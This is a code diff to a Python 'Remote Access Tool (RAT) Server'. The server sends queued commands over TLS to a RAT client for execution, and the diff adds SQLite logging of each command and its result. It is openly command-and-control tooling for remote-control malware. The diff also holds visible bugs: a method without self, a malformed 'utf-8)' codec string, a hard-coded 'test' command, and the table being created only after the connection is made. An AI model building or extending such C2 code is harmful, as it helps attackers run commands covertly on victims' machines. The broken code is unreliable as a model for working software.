@@ -3,7 +3,8 @@ Python Remote Access Tool(RAT) Server
 
 This server takes in a queue of user commands and gives them to a RAT client to be executed. All traffic is encrypted with TLS.
 """
-
+import datetime
+import sqlite3
 import socket
 import ssl
 
@@ -42,6 +43,17 @@ class SERVER:
         self.host = host
         self.port = port
     
+    def make_db(db_file):
+        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
+        cur = db.cursor()
+        cur.execute("DROP TABLE IF EXISTS COMMANDS")
+        db.commit()
+        cur.execute('''CREATE TABLE COMMANDS(TIME TEXT PRIMARY KEY, COMMAND TEXT, RESULT TEXT);''')
+        db.commit()
+        print("Table created")
+        db.close()
+        
+    
     def make_connection(self):
         """
         Connect client and server.
@@ -67,9 +79,18 @@ class SERVER:
                 if not data:
                     break
                 print(f"Received: {data.decode('utf-8')}")
+                db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
+                cur = db.cursor()
+                cur.execute("INSERT INTO COMMANDS(TIME, COMMAND, RESULT) VALUES (?, ?, ?)", (str(datetime.datetime.now()), "test", data.decode('utf-8)')))
+                db.commit()
+                cur.execute("SELECT TIME, COMMAND, RESULT FROM COMMANDS")
+                for row in cur:
+                    print(f"{row[0]}: {row[1]} -> {row[2]}")
+                db.close()
 
 if __name__ == "__main__":
 
     server = SERVER("127.0.0.1", 4445) #Initialize the server
     server.make_connection() #Listen for the client
+    server.make_db()
     server.execute() #Run the rat
